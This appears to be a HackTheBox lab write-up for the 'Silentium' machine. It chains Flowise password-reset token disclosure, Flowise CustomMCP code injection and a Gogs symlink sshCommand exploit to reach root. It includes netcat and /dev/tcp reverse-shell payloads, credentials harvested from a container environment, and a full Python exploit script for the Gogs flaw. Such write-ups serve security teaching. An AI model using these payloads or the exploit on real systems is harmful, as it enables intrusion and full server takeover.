---
title: "Silentium"
date: 2026-09-12 00:00:00 +0500
categories: [HackTheBox, Linux]
tags: [CVE-2025-58434, Flowise, CVE-2025-59528, RCE, CVE-2025-8110, Gogs, RCE]
description: Writeup for HackTheBox Silentium machine
image:
  path: assets/img/silentium/silentium.png
  alt: HTB Silentium
---


## Executive Summary

This assessment demonstrates a full attack chain against a Linux server running two internal web applications. The exploitation path chains three distinct techniques:

- **CVE-2025-58434** — A critical authentication bypass in Flowise 3.0.5 where the `forgot-password` API endpoint returns a valid password reset token in the response body without requiring any prior authentication, enabling account takeover of any user including the administrator.
- **CVE-2025-59528** — Remote Code Execution through Flowise's `CustomMCP` node, which passes unsanitized user input directly into JavaScript's `Function()` constructor, allowing arbitrary code execution inside the Node.js runtime of the Docker container.
- **CVE-2025-8110** — Authenticated Remote Code Execution in Gogs 0.13.3 via improper symbolic link handling in the `PutContents` API. A symlink inside a repository is used to overwrite the `.git/config` file with a malicious `sshCommand` entry, achieving code execution as the root user running the Gogs process.

---

## Reconnaissance

### Nmap Scan

The engagement begins with a two-phase Nmap scan: a fast full-port scan identifies open ports, then a targeted version and script scan runs only against those specific ports for an accurate service fingerprint.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -Pn -p $(sudo nmap -Pn -p- --min-rate 10000 $ip | grep 'open' | cut -d '/' -f 1 | paste -sd ,) $ip -oN nmap.scan

Nmap scan report for 10.129.245.103
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

**Analysis:**
- **Port 22 (SSH / OpenSSH 9.6p1):** A modern OpenSSH version on Ubuntu. No known critical vulnerabilities; however, any valid credentials discovered during the assessment can be used to establish a stable session here.
- **Port 80 (HTTP / nginx 1.24.0):** The web server immediately redirects to `http://silentium.htb/`, indicating a virtual-hosted application. nginx 1.24.0 is a recent stable release with no notable CVEs applicable here.
- **OS Identification:** The SSH service banner confirms Ubuntu Linux.

The attack surface is entirely web-based. Register the hostname in the local hosts file:

```shell
$ echo "$ip silentium.htb" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

### Main Application

Browsing `http://silentium.htb` presents a corporate landing page for a technology consultancy.

<img src="assets/img/silentium/home.png" alt="error loading image">

The footer section of the homepage lists employees associated with the firm. This reveals real usernames and email addresses — critical information for later targeting:

<img src="assets/img/silentium/users.png" alt="error loading image">

**Finding:** Employee `ben` is listed, which corresponds to the email `ben@silentium.htb`. This is the administrative account we will target.

---

### Virtual Host Enumeration

Nginx is configured for virtual hosting, meaning additional subdomains may serve entirely separate applications from the same IP address. `gobuster` is used in virtual host enumeration mode to brute-force subdomains:

```shell
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -u http://silentium.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --ad -t 40 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://silentium.htb/
[+] Method:                    GET
[+] Threads:                   40
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
staging.silentium.htb Status: 200 [Size: 3142]
#www.silentium.htb Status: 400 [Size: 166]
#mail.silentium.htb Status: 400 [Size: 166]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================                                                 
```

**Analysis:**
- `--ad` (`--append-domain`) causes gobuster to send requests with the tested word appended as a subdomain of the base domain, e.g. `Host: staging.silentium.htb`, matching how nginx virtual hosts work.
- The `400 Bad Request` responses for `www` and `mail` indicate those hosts are not configured.
- **`staging.silentium.htb` returns HTTP 200** — a valid, accessible virtual host. The word "staging" strongly suggests a development or pre-production environment, which often has weaker security controls or exposes admin/developer tooling.

Add the staging subdomain to the hosts file:

```shell
$ echo "$ip staging.silentium.htb" | sudo tee -a /etc/hosts
```

---

### Flowise on the Staging Subdomain

Browsing `http://staging.silentium.htb/` reveals a [Flowise](https://flowiseai.com/) login page. Flowise is an open-source, low-code platform for building LLM-powered applications and AI workflows with a visual node-based interface.

<img src="assets/img/silentium/flowise_login.png" alt="error loading Image">

There is no public registration endpoint visible in the UI. Directory and endpoint enumeration with feroxbuster reveals only static assets and no additional attack surface via the frontend:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/Silentium]
└─$ feroxbuster -u http://staging.silentium.htb/
                                                                                                                                                 
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://staging.silentium.htb/
 🚩  In-Scope Url          │ staging.silentium.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       69l      239w     3142c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET       10l       15w      156c http://staging.silentium.htb/assets => http://staging.silentium.htb/assets/
[####################] - 3m     60000/60000   0s      found:1       errors:0      
[####################] - 3m     30000/30000   150/s   http://staging.silentium.htb/ 
[####################] - 3m     30000/30000   151/s   http://staging.silentium.htb/assets/                                                                                            
```

**Analysis:** No useful directories were discovered via the wordlist scan. The frontend is minimal. However, Flowise exposes a REST API. Consulting the [Flowise API documentation](docs.flowiseai.com/api-reference), the version endpoint reveals the installed version without authentication:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/Silentium]
└─$ curl -s http://staging.silentium.htb/api/v1/version | jq
{
  "version": "3.0.5"
}
```

**Finding:** Flowise version **3.0.5** is running. This is a significant discovery — Flowise 3.0.5 is simultaneously affected by two critical CVEs: an authentication bypass (**CVE-2025-58434**) and a remote code execution vulnerability (**CVE-2025-59528**).

---

## CVE-2025-58434 — Flowise Unauthenticated Password Reset Token Disclosure

### Vulnerability Overview

| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2025-58434 |
| **Component** | Flowise `forgot-password` API endpoint |
| **Affected Versions** | ≤ 3.0.5 |
| **Vulnerability Type** | Missing Authentication for Critical Function (CWE-306) |
| **CVSS Score** | 9.8 (Critical) |
| **Patched in** | Version 3.0.6 |
| **Advisory** | [GHSA-wgpv-6j63-x5ph](https://github.com/advisories/GHSA-wgpv-6j63-x5ph) |

### Technical Details

Standard password reset flows work as follows: the user submits their email address, the server generates a temporary token, stores it in the database, and sends it **only to the user's registered email address** via an out-of-band channel. The API response itself returns only a generic success message, never exposing the token directly.

Flowise 3.0.5 breaks this contract. The `/api/v1/account/forgot-password` endpoint generates a `tempToken` and stores it in the database, but then **includes the full token directly in the JSON API response body**, without verifying that the requester is the actual account owner. Because the endpoint also requires no authentication (no session cookie, no API key), any unauthenticated attacker who knows a valid email address can request a password reset token for that account, receive it immediately in the response, and proceed to reset the password — achieving complete account takeover in two API calls.

### Exploitation

**Step 1 — Request the password reset token for the target account**

The employee email `ben@silentium.htb` was identified from the main site. We POST to the forgot-password endpoint:

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password -H "Content-Type: application/json" -d '{"user":{"email":"ben@silentium.htb"}}' | jq                    
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$UT7mFDfR2uz.6FxWcSyh2O8vvPs4Njl9oWuH.nTBUhavtRhl0RUXe",
    "tempToken": "Yk3jJlbraeP3uEOZ6PyL3ekq6MWOhjlSnzQ6hpQ2Cu5We1WibnRG3C1103z4njti",
    "tokenExpiry": "2026-04-20T17:21:16.198Z",
    "status": "active",
    "createdDate": "2026-01-29T20:14:57.000Z",
    "updatedDate": "2026-04-20T17:06:16.000Z",
    "createdBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "updatedBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73"
  },
  "organization": {},
  "organizationUser": {},
  "workspace": {},
  "workspaceUser": {},
  "role": {}
}
```

**Analysis of the response:**
- `name: "admin"` — Confirms this account has administrator privileges.
- `credential` — The bcrypt hash of the current password. This is exposed in the response, though the hash alone is not directly useful (bcrypt is computationally resistant to cracking).
- `tempToken: "Yk3jJlbraeP3uEOZ6PyL3ekq6MWOhjlSnzQ6hpQ2Cu5We1WibnRG3C1103z4njti"` — This is the token that should have only been sent to `ben@silentium.htb`'s inbox. We have it now.
- `tokenExpiry` — The token is time-limited, so the reset must be performed promptly.

**Step 2 — Reset the admin password using the exposed token**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{ 
        "user":{
          "email":"ben@silentium.htb",
          "tempToken":"Yk3jJlbraeP3uEOZ6PyL3ekq6MWOhjlSnzQ6hpQ2Cu5We1WibnRG3C1103z4njti",
          "password":"Password123!"
       }}' | jq
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$XHgYgOZdtZLGTBBBufBsq.A/jXlaledmqErDZ.OvG1PficgdM.93y",
    "tempToken": "",
    "tokenExpiry": null,
    "status": "active",
    "createdDate": "2026-01-29T20:14:57.000Z",
    "updatedDate": "2026-04-20T17:06:35.000Z",
    "createdBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "updatedBy": "e26c9d6c-678c-4c10-9e36-01813e8fea73"
  },
  "organization": {},
  "organizationUser": {},
  "workspace": {},
  "workspaceUser": {},
  "role": {}
}
```

**Analysis of the response:**
- `credential` has changed to a new bcrypt hash — the password has been successfully updated to `Password123!`.
- `tempToken: ""` and `tokenExpiry: null` — The token has been consumed and invalidated.

The admin account `ben@silentium.htb` is now under our control with the password `Password123!`.

---

## CVE-2025-59528 — Flowise CustomMCP Node Remote Code Execution

### Vulnerability Overview

| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2025-59528 |
| **Component** | Flowise `CustomMCP` node (`node-load-method` API) |
| **Affected Versions** | ≤ 3.0.5 |
| **Vulnerability Type** | Server-Side JavaScript Injection via `Function()` constructor |
| **CVSS Score** | 10.0 (Critical) |
| **Patched in** | Version 3.0.6 |
| **Advisory** | [GHSA-3gcm-f6qx-ff7p](https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p) |

### Technical Details

Flowise supports a `CustomMCP` node that allows users to configure custom Model Context Protocol (MCP) server connections. When the frontend calls the `/api/v1/node-load-method/customMCP` endpoint with `"loadMethod": "listActions"`, the backend reads the `mcpServerConfig` input string and passes it to an internal `convertToValidJSONString` function.

The critical flaw is that this function evaluates the user-provided string by passing it directly into JavaScript's `Function()` constructor — essentially the same as `eval()`. Because this runs inside the Flowise Node.js process, it has access to Node.js's full module system, including `child_process`, which allows executing arbitrary operating system commands. There is no sandboxing, escaping, or allowlist validation applied to the input before it is evaluated.

The exploit payload exploits this by embedding a call to `process.mainModule.require("child_process")` inside a JavaScript IIFE (Immediately Invoked Function Expression) wrapped in an object literal, which is what `Function()` expects as a "JSON-like" expression:

```js
({x:(function(){const cp = process.mainModule.require("child_process");cp.execSync("COMMAND");return 1;})()})
```

### Shell as Ben (Docker Container Root)

**Step 1 — Retrieve the API key**

After logging in to `http://staging.silentium.htb` as `ben@silentium.htb:Password123!`, navigate to `/apikey`. Copy the `DefaultKey` value — this is the Bearer token required by authenticated API endpoints.

<img src="assets/img/silentium/apikey.png" alt="error loading image">

**Step 2 — Trigger code execution via the CustomMCP endpoint**

With the API key in hand, send a POST request to the `node-load-method` endpoint for the `customMCP` node. The `mcpServerConfig` input field contains our IIFE payload, which executes a named-pipe reverse shell:

```shell
┌──(kali㉿kali)-[~/HTB/Linux/Silentium]
└─$ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.113 4444 >/tmp/f\");return 1;})()})"
    }  
  }'
```

**Payload anatomy:**
- `process.mainModule.require("child_process")` — Loads Node.js's `child_process` module using the root module's `require` function to bypass any sandboxed module resolution.
- `cp.execSync("...")` — Executes the reverse shell command synchronously in the OS shell.
- `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <ip> <port> >/tmp/f` — A classic named-pipe reverse shell: creates a FIFO at `/tmp/f`, pipes its input to a shell whose output is forwarded to the attacker's netcat listener, which in turn feeds back into the FIFO.

**Step 3 — Catch the shell**

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.113] from (UNKNOWN) [10.129.26.220] 41001
/bin/sh: can't access tty; job control turned off
/ # whoami
root
/ # ls -la /
total 68
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 .
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 ..
-rwxr-xr-x    1 root     root             0 Apr  8 15:14 .dockerenv
drwxr-xr-x    1 root     root          4096 Jul 16  2025 bin
drwxr-xr-x    5 root     root           340 Apr 20 16:33 dev
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 etc
drwxr-xr-x    1 root     root          4096 Jul 16  2025 home
drwxr-xr-x    1 root     root          4096 Jul 15  2025 lib
drwxr-xr-x    5 root     root          4096 Jul 15  2025 media
drwxr-xr-x    2 root     root          4096 Jul 15  2025 mnt
drwxr-xr-x    1 root     root          4096 Jul 16  2025 opt
dr-xr-xr-x  285 root     root             0 Apr 20 16:33 proc
drwx------    1 root     root          4096 Apr  8 09:41 root
drwxr-xr-x    3 root     root          4096 Jul 15  2025 run
drwxr-xr-x    2 root     root          4096 Jul 15  2025 sbin
drwxr-xr-x    2 root     root          4096 Jul 15  2025 srv
dr-xr-xr-x   13 root     root             0 Apr 20 16:33 sys
drwxrwxrwt    1 root     root          4096 Apr 20 17:17 tmp
drwxr-xr-x    1 root     root          4096 Apr  8 09:41 usr
drwxr-xr-x    1 root     root          4096 Jul 15  2025 var
/ # hostname
c78c3cceb7ba
```

**Analysis:** We have a shell as `root` inside a Docker container (`c78c3cceb7ba` and the presence of `/.dockerenv` confirm this). The filesystem layout is an Alpine Linux container. As root inside the container, we can read environment variables and examine the container configuration for a path to the host system.

---

## Container Escape — Credential Discovery via Environment Variables

### Extracting Environment Variables

Docker containers inherit configuration from environment variables set in the `docker-compose.yml` or `docker run` invocation. Dumping the container environment frequently reveals service credentials:

```shell
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

**Key findings from the environment:**
- `FLOWISE_USERNAME=ben` / `FLOWISE_PASSWORD=F1l3_d0ck3r` — The Flowise application credentials. Note these differ from the Flowise database credentials we reset earlier.
- `SMTP_PASSWORD=r04D!!_R4ge` — The password for the SMTP service account (`SMTP_USERNAME=test`, `SMTP_HOST=mailhog`). Since the SMTP username is `test` but the hostname's user is likely `ben`, attempt this password against the SSH service on the host using `ben` as the username.
- JWT secrets are hardcoded placeholder values, confirming a poorly secured deployment.

### SSH to the Host as Ben

```shell
┌──(kali㉿kali)-[~]
└─$ sshpass -p 'r04D!!_R4ge' ssh -o StrictHostKeyChecking=no ben@$ip                       
Warning: Permanently added '10.129.26.220' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

ben@silentium:~$ wc -c user.txt 
33 user.txt
```

The SMTP password `r04D!!_R4ge` was reused as the SSH password for user `ben` on the host system. We now have an interactive SSH session on the Ubuntu host and the user flag.

---

## Privilege Escalation — Gogs 0.13.3 RCE (CVE-2025-8110)

### Internal Service Discovery

Enumerating the `/opt` directory and running processes reveals a self-hosted **Gogs** Git service:

```shell
ben@silentium:~$ ls -la /opt
total 16
drwxr-xr-x  4 root root 4096 Apr  8 18:30 .
drwxr-xr-x 22 root root 4096 Apr  8 09:41 ..
drwx--x--x  4 root root 4096 Apr  8 09:41 containerd
drwxr-xr-x  6 root root 4096 Apr  8 09:41 gogs
ben@silentium:~$ ps aux | grep gogs
root        1537  0.0  1.7 1738412 68612 ?       Ssl  16:33   0:01 /opt/gogs/gogs/gogs web
ben         8898  0.0  0.0   6544  2280 pts/0    S+   17:40   0:00 grep --color=auto gogs
```

**Analysis:** The Gogs process is running as **`root`** (confirmed in the `ps aux` USER column). If we can execute code through Gogs, it will run as `root` on the host directly.

Checking all listening network sockets:

```shell
ben@silentium:~$ ss -tunlp
Netid         State          Recv-Q         Send-Q                 Local Address:Port                  Peer Address:Port         Process         
udp           UNCONN         0              0                         127.0.0.54:53                         0.0.0.0:*                            
udp           UNCONN         0              0                      127.0.0.53%lo:53                         0.0.0.0:*                            
udp           UNCONN         0              0                            0.0.0.0:68                         0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:3000                       0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:3001                       0.0.0.0:*                            
tcp           LISTEN         0              511                          0.0.0.0:80                         0.0.0.0:*                            
tcp           LISTEN         0              4096                         0.0.0.0:22                         0.0.0.0:*                            
tcp           LISTEN         0              4096                   127.0.0.53%lo:53                         0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:8025                       0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:40431                      0.0.0.0:*                            
tcp           LISTEN         0              4096                       127.0.0.1:1025                       0.0.0.0:*                            
tcp           LISTEN         0              4096                      127.0.0.54:53                         0.0.0.0:*                            
tcp           LISTEN         0              511                             [::]:80                            [::]:*                            
tcp           LISTEN         0              4096                            [::]:22                            [::]:*  
```

**Analysis of listening ports:**
- Port `3000` on `127.0.0.1` — The Flowise Docker container (mapped internally).
- Port `3001` on `127.0.0.1` — The Gogs web interface, only accessible from localhost.
- Port `8025` — MailHog web UI (the fake SMTP server referenced by `SMTP_HOST=mailhog`).
- Port `1025` — MailHog SMTP listener.

Gogs is only accessible from inside the server (localhost:3001), not from the internet. We need SSH port forwarding to reach it.

Confirm the Gogs version:

```shell
ben@silentium:~$ /opt/gogs/gogs/gogs -v
Gogs version 0.13.3
```

**Finding:** Gogs **0.13.3** is running as **root** on localhost:3001. This version is vulnerable to [CVE-2025-8110](https://cloud.projectdiscovery.io/library/CVE-2025-8110) — an authenticated Remote Code Execution vulnerability.

### SSH Port Forwarding

To reach the Gogs interface from our attacker machine, we forward the remote port 3001 through the SSH tunnel:

```shell
┌──(kali㉿kali)-[~]
└─$ sshpass -p 'r04D!!_R4ge' ssh -o StrictHostKeyChecking=no -L 3001:localhost:3001 ben@$ip
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

ben@silentium:~$ 
```

**Command explanation:**
- `-L 3001:localhost:3001` — Binds port `3001` on the local attacker machine and tunnels all traffic to `localhost:3001` as seen from the SSH server. Any request to `http://localhost:3001` on Kali is now forwarded to the Gogs instance on the target.

The Gogs interface is now reachable at `http://localhost:3001`:

<img src="assets/img/silentium/gogs.png" alt="error loading image">

---

## CVE-2025-8110 — Gogs Authenticated RCE via Symlink + sshCommand Injection

### Vulnerability Overview

| Attribute | Value |
|---|---|
| **CVE ID** | CVE-2025-8110 |
| **Component** | Gogs `PutContents` API (repository file write endpoint) |
| **Affected Versions** | Gogs ≤ 0.13.3 |
| **Vulnerability Type** | Improper Symbolic Link Handling / Path Traversal |
| **CVSS Score** | ~8.8 (High) |
| **Reference** | [ProjectDiscovery Advisory](https://cloud.projectdiscovery.io/library/CVE-2025-8110) |
| **Status** | Added to CISA KEV Catalog |

### Technical Details

The vulnerability involves three components working in sequence:

**1. Symbolic Link Blind Spot in `PutContents`**

Gogs previously patched a related path traversal vulnerability (CVE-2024-55947), but the fix only addressed direct directory traversal (`../`). It failed to account for **symbolic links** — files in a repository that point to locations outside the repository tree. The `PutContents` API, which handles the creation and modification of repository files, does not validate whether the target path is a symlink pointing outside the repository before writing to it.

**2. Symlink to `.git/config` Injection**

An attacker creates a repository, commits a symbolic link (`malicious_link`) that points to `.git/config` (the Git configuration file for the repository itself, containing remote origin URLs and other settings). This symlink is then pushed to the server, and Gogs stores it faithfully.

**3. Overwriting `.git/config` with `sshCommand`**

When the attacker calls `PutContents` via the API to update `malicious_link` with custom content, the operating system follows the symlink and writes the content to the actual `.git/config` file. The attacker supplies a crafted `.git/config` that includes a `sshCommand` directive under `[core]`. When Git subsequently performs any SSH-based remote operation on this repository (such as a fetch or push to `git@localhost`), Git reads the config and executes the value of `sshCommand` as a shell command — achieving arbitrary code execution with the privileges of the Gogs server process (which is `root` here).

### Exploit Setup

**Register a new user on Gogs** at `http://localhost:3001` (open registration is enabled).

**Create an API token** at `/user/settings/applications` — navigate to Settings → Applications → Generate new token.

<img src="assets/img/silentium/gogs_api.png" alt="error loading image">

### Exploit Script

The following exploit script automates the full attack chain. Credit goes to **Ghxstsec** for the [original exploit repository](https://github.com/Ghxstsec/CVE-2025-8110.git); the version used here adds `--username` and `--token` arguments for compatibility.

```python
#!/usr/bin/env python3
"""
Gogs CVE-2025-8110 Exploit
Remote Code Execution via .git/config symlink bypass

Author: Ghxstsec
Version: 1.0
"""

import argparse
import requests
import os
import subprocess
import shutil
import urllib3
from urllib.parse import urlparse
import base64
from bs4 import BeautifulSoup
from rich.console import Console
import urllib.parse

# ====================== BANNER ASCII ======================
console = Console()

console.print(r"""
[bold red]
   _____ _____   _____ 
  / ____|  __ \ / ____|
 | |  __| |__) | |  __ 
 | | |_ |  _  /| | |_ |
 | |__| | | \ \| |__| |
  \_____|_|  \_\\_____| 
                       
[bold yellow]CVE-2025-8110[/bold yellow] - Gogs Remote Code Execution
[bold cyan]Authenticated RCE via Symlink + sshCommand Injection[/bold cyan]
[/bold red]
""")

console.print("[bold white]Author : ghxtsec[/bold white]")
console.print("[bold white]Based on: zAbuQasem original PoC[/bold white]")
console.print("[bold white]------------------------------------------------[/bold white]\n")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}
 

def login(session, base_url, username, password):
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)
    csrf = extract_csrf(resp.text)

    login_data = {
        "_csrf": csrf,
        "user_name": username,
        "password": password,
    }
    resp = session.post(
        login_url,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=login_data,
        allow_redirects=True,
    )
    if "user/login" in resp.url:
        console.print(f"[bold red]Login failed: {resp.status_code}[/bold red]")
        raise ValueError("Authentication failed")
    console.print("[bold green][+] Login successful[/bold green]")
    return session.cookies


def create_malicious_repo(session, base_url, token):
    api = f"{base_url}/api/v1/user/repos"
    repository_name = os.urandom(6).hex()
    data = {
        "name": repository_name,
        "description": "Malicious repo for CVE-2025-8110",
        "auto_init": True,
        "readme": "Default",
        "private": False,
    }
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.post(api, json=data)
    console.print(f"[blue]Repo creation status: {resp.status_code}[/blue]")
    if resp.status_code not in (201, 200):
        console.print(f"[red]Error creating repo: {resp.text}[/red]")
        raise ValueError("Repo creation failed")
    console.print(f"[bold green][+] Repo created: {repository_name}[/bold green]")
    return repository_name


def upload_malicious_symlink(base_url, username, password, repo_name):
    """Clone + symlink + commit + push"""
    repo_dir = f"/tmp/{repo_name}"
    parsed_url = urlparse(base_url)
    base_path = parsed_url.path.rstrip("/")

    encoded_username = urllib.parse.quote(username, safe='')
    encoded_password = urllib.parse.quote(password, safe='')

    clone_url = (
        f"{parsed_url.scheme}://{encoded_username}:{encoded_password}@"
        f"{parsed_url.netloc}{base_path}/{username}/{repo_name}.git"
    )

    clone_cmd = ["git", "clone", clone_url, repo_dir]

    symlink_path = os.path.join(repo_dir, "malicious_link")

    try:
        if os.path.exists(repo_dir):
            shutil.rmtree(repo_dir)

        console.print(f"[blue]Clone url: {clone_url}[/blue]")

        subprocess.run(clone_cmd, check=True, capture_output=True)
        
        os.symlink(".git/config", symlink_path)

        subprocess.run(["git", "add", "malicious_link"], cwd=repo_dir, check=True)
        subprocess.run(["git", "commit", "-m", "Add malicious symlink"], cwd=repo_dir, check=True)
        subprocess.run(["git", "push", "origin", "master"], cwd=repo_dir, check=True)

        console.print("[bold green][+] Symlink created & uploaded[/bold green]")
    except subprocess.CalledProcessError as e:
        error_msg = e.stderr.decode() if e.stderr else str(e)
        raise ValueError(f"Git command failed: {error_msg}") from e
    except Exception as e:
        raise ValueError(f"Error upload_symlink: {e}") from e


def exploit(session, base_url, token, username, repo_name, command):
    """Enviar el overwrite del .git/config vía API."""
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    data = {
        "message": "Exploit CVE-2025-8110",
        "content": base64.b64encode(command.encode()).decode(),
    }
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }
    resp = session.put(api, json=data, headers=headers, timeout=10)
    console.print(f"[blue]Exploit status: {resp.status_code}[/blue]")
    if resp.status_code in (200, 201):
        console.print("[bold green][+] Exploit Successful, check your listener[/bold green]")
    else:
        console.print(f"[bold red][-] Exploit failed: {resp.text}[/bold red]")


def extract_csrf(html_text):
    soup = BeautifulSoup(html_text, "html.parser")
    token_input = soup.select_one("input[name=_csrf]")
    if token_input and token_input.get("value"):
        return token_input.get("value")
    raise ValueError("CSRF token not found")


def main():
    parser = argparse.ArgumentParser(description="Gogs CVE-2025-8110 Exploit")
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL (e.g: http://target.com:3000)")
    parser.add_argument("-lh", "--host", required=True, help="your IP")
    parser.add_argument("-lp", "--port", required=True, help="port for rev shell")
    parser.add_argument("-x", "--proxy", action="store_true", help="local proxy (default: off)")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-t", "--token", required=True, help="Token Gogs website Settings -> Applications -> Generate new token")
    parser.add_argument("-U", "--username", required=True, help="Username")
    args = parser.parse_args()

    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False

    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"

    try:
        login(session, args.url, args.username, args.password)
        repo_name = create_malicious_repo(session, args.url, args.token)

        git_config = f"""[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
	ignorecase = true
	precomposeunicode = true
  sshCommand = {command}
[remote "origin"]
	url = git@localhost:gogs/{repo_name}.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
	remote = origin
	merge = refs/heads/master
"""

        upload_malicious_symlink(args.url, args.username, args.password, repo_name)
        exploit(session, args.url, args.token, args.username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")

if __name__ == "__main__":
    main()
```

**CLI arguments:**

| Argument | Description |
|---|---|
| `-u` / `--url` | Base URL of the Gogs instance (e.g. `http://localhost:3001`). |
| `-U` / `--username` | Your registered Gogs username. |
| `-p` / `--password` | Your Gogs account password (used for web login and git clone). |
| `-t` / `--token` | API token generated from Gogs Settings → Applications. |
| `-lh` / `--host` | Attacker IP for the reverse shell callback. |
| `-lp` / `--port` | Attacker port for the reverse shell listener. |
